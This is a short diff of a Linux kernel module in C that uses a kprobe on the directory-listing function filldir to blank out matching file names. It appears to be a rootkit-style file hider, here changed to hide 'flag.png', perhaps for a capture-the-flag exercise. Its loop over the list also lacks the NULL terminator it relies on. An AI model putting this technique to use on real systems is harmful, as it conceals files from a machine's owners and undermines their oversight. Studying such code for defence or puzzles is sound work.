@@ -17,19 +17,18 @@
 #endif
 
 static const char *files_to_hide[] = {
-	"file_hide",	   "file_hide.c",     "file_hide.ko", "file_hide.mod",
-	"file_hide.mod.c", "file_hide.mod.o", "file_hide.o",  "Makefile",
-	"modules.order",   "Module.symvers",
+	"flag.png"
 };
 
 /* For each probe you need to allocate a kprobe structure */
 static struct kprobe kp = {
-	.symbol_name = "filldir64",
+	.symbol_name = "filldir",
 };
 
 /* kprobe pre_handler: called just before the probed instruction is executed */
 static int __kprobes handler_pre(struct kprobe *p, struct pt_regs *regs)
 {
+	dbg_print("handler_pre !!!");
 	char *filename = (char *)regs->si;
 	const char **file;
 
@@ -40,8 +39,10 @@ static int __kprobes handler_pre(struct kprobe *p, struct pt_regs *regs)
 	for (file = files_to_hide; *file != NULL; file++) {
 		if (strcmp(filename, *file) == 0) {
 			dbg_print("Hiding file: %s\n", filename);
-			strcpy((char *)regs->si, "\x00");
+			strcpy((char*)regs->si, "\x00");
+			// *(uint16_t*)regs->si = 0;
 		}
+		
 	}
 
 	return 0;
